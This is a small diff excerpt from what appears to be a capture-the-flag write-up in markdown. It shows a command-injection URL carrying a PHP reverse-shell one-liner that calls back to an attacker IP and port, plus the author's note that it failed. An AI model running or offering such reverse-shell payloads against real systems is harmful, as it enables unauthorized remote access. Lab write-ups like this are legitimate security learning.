@@ -74,7 +74,7 @@ MAC Address: 02:B3:8F:7B:A4:5B (Unknown)
 
 ```
 http://10.10.254.41/assets/index.php?cmd=php -r '$sock=fsockopen("10.10.105.73", 1984);exec("sh <&3 >&3 2>&3");'
-
+```
 ![revshellurlEncode](https://github.com/user-attachments/assets/6a0b0861-e3a3-4909-9193-c997e8e3f368)
 
 </br> dang it, doesn't work....
